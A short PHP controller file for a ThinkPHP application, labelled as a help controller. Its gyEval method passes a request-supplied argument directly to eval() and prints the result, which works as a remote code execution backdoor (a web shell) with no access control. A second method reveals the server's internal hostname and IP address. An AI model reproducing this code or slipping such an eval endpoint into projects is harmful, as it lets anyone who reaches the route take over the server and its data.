<?php
/**
 * Created by PhpStorm.
 * User: liguangyao
 * Date: 2020/3/17
 * Time: 08:30
 */
namespace app\index\controller;
Class HelpController extends \think\Controller{
    public function GetInnerURL(){
        $server_hostname=gethostname();
        $server_hostname .= ".";
        $server_ip=gethostbyname($server_hostname);
        echo 'hostname:'.$server_hostname.'<br/>';
        echo 'host:'.$server_ip;
    }

    public function gyEval($eval){
        var_dump(eval($eval));
    }
}